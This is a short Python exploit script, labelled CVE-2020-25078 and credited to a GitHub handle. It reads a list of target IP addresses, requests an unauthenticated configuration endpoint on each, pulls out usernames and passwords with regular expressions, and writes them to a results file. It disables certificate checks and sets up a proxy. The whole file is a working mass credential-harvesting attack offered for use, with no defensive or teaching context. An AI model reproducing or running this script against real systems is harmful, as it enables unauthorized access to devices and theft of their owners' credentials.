import urllib.request
import urllib.error
import socket
import ssl
import re

'''
Github ==> github.com/chinaYozz
百度 ==>> Xs小屋
'''

ssl._create_default_https_context = ssl._create_unverified_context
#Set HTTP proxy
http_proxy = "127.0.0.1:10809"
proxy_support = urllib.request.ProxyHandler({'http':'http://'+http_proxy,'https':'https://'+http_proxy})
opener = urllib.request.build_opener(proxy_support)
#Enable HTTP proxy
#urllib.request.install_opener(opener)


def get_auxiliary(file_ip):
	shellcode = "/config/getuser?index=0"
	headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
	http = urllib.request.Request(url=file_ip+shellcode,headers=headers);
	try:
		http_run = urllib.request.urlopen(http,timeout=5)
	except socket.timeout as e:
		#print("connection timed out")
		pass
	except urllib.error.HTTPError as e:
		#print(e.code)
		pass
	except urllib.error.URLError as e:
		#print(e)
		pass
	else:
		return_http = str(http_run.read())
		username = str(re.findall(r"name=(\w+)",return_http))
		password = str(re.findall(r"pass=(\w+)",return_http))
		print("[+Login URL]==>",file_ip,"\nUserName:",username,"\t","PassWord:",password+'\n\n')
		export = open("./exploit_ok.txt",'a',encoding="utf-8")
		flag = "[+Login URL]==>"+file_ip+"\n[+UserName]==>"+username+"\t[+PassWord]==>"+password+'\n\n'
		export.write(flag)
		export.close()

def exploit():
	file = open('./ip.txt','r',encoding='utf-8')
	for i in file.readlines():
		ip_port_list = i.strip()
		#print(ip_port_list)
		get_auxiliary(ip_port_list)

if __name__ == '__main__':
	print("Exploit + CVE-2020-25078\nGithub：github.com\chinaYozz\n")
	print("Start Running Exploit...\n")
	exploit()
	exit()